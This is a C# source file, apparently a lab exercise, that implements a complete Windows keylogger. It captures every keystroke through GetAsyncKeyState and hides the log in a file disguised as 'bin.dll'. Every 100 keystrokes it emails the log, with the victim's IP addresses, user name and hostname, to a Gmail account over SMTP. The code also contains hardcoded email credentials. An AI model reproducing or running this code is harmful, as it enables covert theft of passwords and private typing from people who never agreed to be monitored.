using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace lab4_1
{
    class Program
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeystrokes = 0;


        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\bin.dll");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);


            while(true)
            {
                Thread.Sleep(5);

                for (int i = 0; i < 2000; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 32769)
                    {
                        Console.Write((char)i);

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }

                        numberOfKeystrokes++;

                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }

                    }
                }
            }
        }

        static void SendNewMessage()
        {
            //send the contents of the text file to an external email address.

            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\bin.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //create an email message

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address; 
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("dimaplaysgg@gmail.com");
            mailMessage.To.Add("dimaplaysgg@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("dimaplaysgg@gmail.com", "1a2b3c4A5B6C");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }       
    }


}
